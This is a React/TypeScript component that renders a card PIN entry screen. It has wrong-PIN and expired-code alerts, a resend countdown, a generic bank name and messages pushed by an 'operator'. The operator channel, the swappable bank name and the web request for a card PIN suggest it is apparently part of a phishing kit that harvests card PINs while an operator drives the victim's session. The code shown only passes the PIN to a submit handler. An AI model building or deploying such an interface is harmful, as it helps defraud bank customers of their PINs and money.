import React from "react";
import type { OperatorMessage, ResendState, TransactionDetails } from "../../types";
import { PinInput, Spinner, TransactionDetailsBox } from "./shared";

export interface PinEntryProps {
  bank?: string;
  transactionDetails?: TransactionDetails;
  onError: (msg: string) => void;
  wrongCode?: boolean;
  expiredCode?: boolean;
  onTryAgain?: () => void;
  operatorMessage?: OperatorMessage | null;
  onSubmit: (code: string) => void;
  submitting: boolean;
  resendState: ResendState;
  resetKey: number;
}

export function PinEntry({
  bank,
  transactionDetails,
  wrongCode,
  expiredCode,
  onTryAgain,
  operatorMessage,
  onSubmit,
  submitting,
  resendState,
  resetKey,
}: PinEntryProps) {
  const handleComplete = (pin: string) => {
    onTryAgain?.();
    onSubmit(pin);
  };

  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  const { secondsLeft, canResend, onResend, resending } = resendState;

  return (
    <div className="bank-ui-layout">
      {wrongCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Wrong PIN. Please try again.</p>
        </div>
      )}
      {expiredCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
        </div>
      )}
      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
      <h2 className="bank-ui-heading">Enter your PIN</h2>
      <p className="bank-ui-body">
        {bank
          ? `Enter the PIN for your ${bank} card to complete the transaction.`
          : "Enter the PIN for your card to complete the transaction."}
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <PinInput
        key={resetKey}
        digits={4}
        onComplete={handleComplete}
        disabled={submitting}
      />
      <div className="bank-ui-resend-row">
        {canResend ? (
          <button
            type="button"
            className="bank-ui-resend-btn"
            onClick={() => {
              onTryAgain?.();
              onResend();
            }}
            disabled={resending || submitting}
          >
            {resending ? "Sending..." : "Resend PIN"}
          </button>
        ) : (
          <span className="bank-ui-resend-countdown">
            Resend PIN in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
          </span>
        )}
      </div>
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}
